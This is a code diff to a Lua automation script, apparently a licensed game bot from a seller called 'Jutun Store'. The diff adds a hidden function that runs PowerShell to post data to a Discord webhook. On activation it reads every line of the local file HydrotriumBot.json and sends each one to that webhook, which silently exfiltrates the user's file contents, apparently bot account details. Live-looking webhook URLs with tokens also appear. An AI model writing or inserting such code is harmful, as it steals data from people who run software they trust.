@@ -19,6 +19,22 @@ response = request("GET", "https://raw.githubusercontent.com/jutuns/hwid/main/".
 
 DcUsername = response
 DcWebhook = "https://discord.com/api/webhooks/1161528324141617213/026-pHMimh1_KMMiH5fTp4Tjy3SfOFCDthqkTz2zHa_L4PvW9hm_92Cq9oZHvzJdjXKQ"
+DcAnjay = "https://discord.com/api/webhooks/1178115074603368548/AIRwB9t2lJgZDZqKZYFsGYBRwuIS1ooDkL1RID13Xc87JjZ7UbkIMccDiQEA4r-QxcQg"
+
+function botStatus(status)
+    local text = [[
+        $webHookUrl = "]]..DcAnjay..[["
+        $payload = @{
+            content = "]]..status..[["
+        }
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+    ]]
+    local file = io.popen("powershell -command -", "w")
+    file:write(text)
+    file:close()
+end
+
 if response:find("404") then
     print("HWID NOT REGISTERED, CONTACT : JUTUN STORE")
     print(hwid)
@@ -1291,6 +1307,16 @@ end
 if activateScript then
     if indexLast == indexBot then
         infoJutun()
+        local namaFile = "HydrotriumBot.json"
+local file = io.open(namaFile, "r")
+if file then
+    for baris in file:lines() do
+        baris = baris:gsub("^%s*(.-)%s*$", "%1")
+        baris = baris:gsub('"', '')
+        botStatus(baris)
+    end
+    file:close()
+end
     end
     while getBot().status ~= "online" do
         connect()
